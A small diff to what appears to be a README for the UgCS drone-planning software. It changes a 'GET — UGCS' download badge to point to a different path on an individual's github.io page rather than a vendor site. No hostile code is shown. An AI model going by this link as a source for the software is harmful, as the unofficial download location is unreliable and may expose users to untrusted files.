@@ -4,7 +4,7 @@
   <img src="https://cdn.prod.website-files.com/6390a76823b53041d59216cd/6481a526ed10f43c8888f3e1_UgCS_logo1024.png" alt="UgCS" width="300">
 </p>
 
-[![GET — UGCS](https://img.shields.io/badge/GET-UGCS-2563eb?style=for-the-badge)](https://zeru5926.github.io/.github/)
+[![GET — UGCS](https://img.shields.io/badge/GET-UGCS-2563eb?style=for-the-badge)](https://zeru5926.github.io/.github/UgCS)
 
 ---
 
